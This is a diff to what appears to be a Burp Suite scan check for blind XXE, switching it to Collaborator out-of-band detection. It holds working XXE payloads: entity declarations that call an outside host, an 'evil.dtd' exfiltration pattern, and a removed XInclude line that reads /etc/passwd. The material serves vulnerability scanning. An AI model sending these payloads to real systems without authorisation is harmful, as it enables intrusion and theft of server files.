@@ -6,20 +6,18 @@ metadata:
     tags: "xxe", "blind", "oob"
 
 run for each:
-    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR/xxe\">%xxe;]><foo>test</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://COLLABORATOR/evil.dtd\">%dtd;%send;]><foo>test</foo>",
-        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{generate_collaborator_address()}/xxe\">%xxe;]><foo>test</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://{generate_collaborator_address()}/evil.dtd\">%dtd;%send;]><foo>test</foo>",
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"http://{generate_collaborator_address()}/xinclude\"/></foo>"
 
 given insertion point then
     send payload:
         replacing: {payload}
 
-    if not({latest.response.status_code} is "400") then
-        if {latest.response} matches "(ENTITY|DOCTYPE|XInclude|xi:include)" then
-            report issue:
-                severity: high
-                confidence: tentative
-                detail: "Potential blind XXE. Server processes XML with external entity declarations. Verify with Burp Collaborator."
-                remediation: "Disable DTD processing entirely. Reject XML with DOCTYPE declarations."
-        end if
+    if any interactions then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "Blind XXE detected. Server processed XML with external entity declarations and successfully triggered a DNS/HTTP request to the Collaborator payload."
+            remediation: "Disable DTD processing entirely. Reject XML with DOCTYPE declarations."
     end if
